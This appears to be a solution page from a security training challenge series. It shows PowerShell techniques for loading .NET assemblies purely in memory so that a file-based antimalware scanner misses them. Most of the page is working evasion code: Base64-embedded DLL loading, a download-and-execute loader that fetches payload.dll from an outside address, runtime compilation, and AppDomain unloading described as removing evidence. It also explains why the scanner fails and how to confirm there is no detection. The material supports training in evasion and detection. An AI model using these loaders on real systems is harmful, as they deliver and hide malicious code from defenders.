---
title: "Solution 40: Fileless .NET Assembly Loading"
challenge_number: 40
difficulty: hard
category: "AMSI Bypass"
permalink: /solutions/40-fileless-assembly/
---

# Solution: Fileless .NET Assembly Loading

[Back to Challenge](../challenges/40-fileless-assembly.md)

## Overview

Load a pre-compiled .NET assembly directly from a byte array in memory using `[Reflection.Assembly]::Load()`. No file is ever written to disk, giving file-based scanners nothing to scan. The malicious logic exists only as bytes in process memory.

## Working Code

### Method 1: Load Assembly from Base64 Byte Array

```powershell
# Pre-compiled .NET DLL encoded as Base64
# (This is a minimal example - real payloads would be larger)
$base64 = "TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0KJAAAAAAAAAA..."

# Decode Base64 to byte array
$bytes = [Convert]::FromBase64String($base64)

# Load assembly directly from memory - NO file on disk
$assembly = [Reflection.Assembly]::Load($bytes)

# Get the type and invoke the method
$type = $assembly.GetType("Payload.Runner")
$method = $type.GetMethod("Execute")
$method.Invoke($null, $null)
```

### Method 2: Download and Load (No Disk Touch)

```powershell
# Download assembly bytes directly into memory
$wc = New-Object System.Net.WebClient
$bytes = $wc.DownloadData("http://10.0.0.1/payload.dll")

# Load from the byte array - never touches disk
$assembly = [Reflection.Assembly]::Load($bytes)
$type = $assembly.GetType("Namespace.ClassName")
$type.GetMethod("Run").Invoke($null, @("argument1"))
```

### Method 3: Complete Example with Inline Assembly

```powershell
# Step 1: Create the .NET assembly (done once, on attacker machine)
# This C# code is compiled to a DLL:
<#
using System;
namespace Payload
{
    public class Runner
    {
        public static string Execute()
        {
            // Any arbitrary .NET code here
            string hostname = Environment.MachineName;
            string user = Environment.UserName;
            return $"Executed on {hostname} as {user}";
        }
    }
}
#>

# Step 2: The compiled DLL bytes as Base64 (output of compilation)
$assemblyBytes = @"
TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAIAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5v
dCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0KJAAAAAAAAAA...
"@ -replace '\s',''

$bytes = [Convert]::FromBase64String($assemblyBytes)

# Step 3: Load and execute entirely in memory
$asm = [Reflection.Assembly]::Load($bytes)
$result = $asm.GetType("Payload.Runner").GetMethod("Execute").Invoke($null, $null)
Write-Host $result
```

### Method 4: Using AppDomain for Isolation

```powershell
# Load into a separate AppDomain for cleaner unloading
$domain = [AppDomain]::CreateDomain("PayloadDomain")

# Load assembly bytes
$bytes = [Convert]::FromBase64String($base64Assembly)
$assembly = $domain.Load($bytes)

# Execute
$type = $assembly.GetType("Payload.Runner")
$output = $type.GetMethod("Execute").Invoke($null, $null)
Write-Host $output

# Unload the domain (removes evidence from memory)
[AppDomain]::Unload($domain)
```

### Method 5: Compile at Runtime (No Pre-Compiled DLL)

```powershell
# Compile C# code at runtime - the source is just a string
$source = @'
using System;
public class DynPayload
{
    public static void Run()
    {
        Console.WriteLine("Compiled and executed at runtime");
        Console.WriteLine("Running as: " + Environment.UserName);
        Console.WriteLine("PID: " + System.Diagnostics.Process.GetCurrentProcess().Id);
    }
}
'@

# Compile in memory - no files written
$provider = New-Object Microsoft.CSharp.CSharpCodeProvider
$params = New-Object System.CodeDom.Compiler.CompilerParameters
$params.GenerateInMemory = $true
$params.GenerateExecutable = $false
$params.ReferencedAssemblies.Add("System.dll")

$compiled = $provider.CompileAssemblyFromSource($params, $source)

if ($compiled.Errors.Count -eq 0) {
    $type = $compiled.CompiledAssembly.GetType("DynPayload")
    $type.GetMethod("Run").Invoke($null, $null)
} else {
    $compiled.Errors | ForEach-Object { Write-Host $_.ErrorText }
}
```

## Why It Works

### File-Based Scanner Limitations

```
Traditional scan flow:
    File on disk → Scanner reads bytes → Pattern match → Detection
                   ↑
                   └── THIS IS WHERE THE SCANNER OPERATES

Fileless attack flow:
    Base64 string in script → Decode to byte[] → Assembly.Load(byte[]) → Execute
         ↑                                              ↑
         │                                              └── Code runs in memory
         └── Scanner sees only Base64 text (no PE signatures)
```

The file-based scanner can only analyze what exists on disk:
- It sees the `.ps1` file containing a Base64 string
- Base64 is 100% printable ASCII — passes the non-printable ratio check
- The MZ header, PE structure, and malicious IL code are all encoded
- The scanner cannot decode Base64 and analyze the result

### `Assembly.Load(byte[])` Internals

When `[Reflection.Assembly]::Load($bytes)` is called:
1. The CLR allocates memory for the assembly
2. The byte array is copied into managed heap memory
3. The PE headers are parsed
4. IL code is JIT-compiled to native code on demand
5. **No file is ever created** — not in temp, not in the GAC, not anywhere

The assembly exists purely as an in-memory object in the process's managed heap.

### AMSI v2 Caveat (Windows 10 1903+)

Starting with Windows 10 1903, AMSI v2 added hooks for `Assembly.Load`:
- `AmsiScanBuffer` is called on the raw assembly bytes before loading
- This means a real AMSI provider CAN detect known malicious assemblies

However:
- Our file-based scanner doesn't implement this
- Custom/unknown assemblies won't match AMSI signatures
- The assembly can itself be encrypted and unpacked at runtime

### Why Base64 Encoding Helps

The PE header of a .NET DLL starts with `MZ` (4D 5A). If you embedded raw bytes in a script, scanners might detect PE headers. Base64 converts `4D 5A` into `TVo=` — unrecognizable as a PE file.

## How to Verify

1. Create a minimal .NET assembly for testing:
   ```powershell
   # Compile a test DLL
   $source = 'public class Test { public static string Hi() { return "Assembly loaded from memory!"; } }'
   $provider = New-Object Microsoft.CSharp.CSharpCodeProvider
   $params = New-Object System.CodeDom.Compiler.CompilerParameters
   $params.OutputAssembly = "test_payload.dll"
   $provider.CompileAssemblyFromSource($params, $source) | Out-Null

   # Get its bytes as Base64
   $dllBytes = [IO.File]::ReadAllBytes("test_payload.dll")
   $b64 = [Convert]::ToBase64String($dllBytes)
   Write-Host "Base64 length: $($b64.Length)"
   ```

2. Create the fileless loader script:
   ```powershell
   $loaderScript = @"
   `$bytes = [Convert]::FromBase64String("$b64")
   `$asm = [Reflection.Assembly]::Load(`$bytes)
   `$result = `$asm.GetType("Test").GetMethod("Hi").Invoke(`$null, `$null)
   Write-Host `$result
   "@
   Set-Content -Path "fileless_loader.ps1" -Value $loaderScript
   ```

3. Verify no PE signatures in the script file:
   ```powershell
   $content = [IO.File]::ReadAllBytes("fileless_loader.ps1")
   # Check for MZ header (4D 5A) - should not be present
   for ($i = 0; $i -lt $content.Length - 1; $i++) {
       if ($content[$i] -eq 0x4D -and $content[$i+1] -eq 0x5A) {
           Write-Host "WARNING: MZ header found at offset $i"
       }
   }
   Write-Host "No raw PE bytes in the script file"
   ```

4. Run the scanner:
   ```
   nim_antimalware_sim.exe fileless_loader.ps1
   ```
   Expected: **No detection** — the file contains only Base64 text.

5. Execute to confirm it works:
   ```powershell
   . .\fileless_loader.ps1
   # Output: Assembly loaded from memory!
   ```

6. Confirm no DLL file was created:
   ```powershell
   # The test_payload.dll we made for encoding can be deleted
   Remove-Item test_payload.dll
   # The execution created no new files
   ```
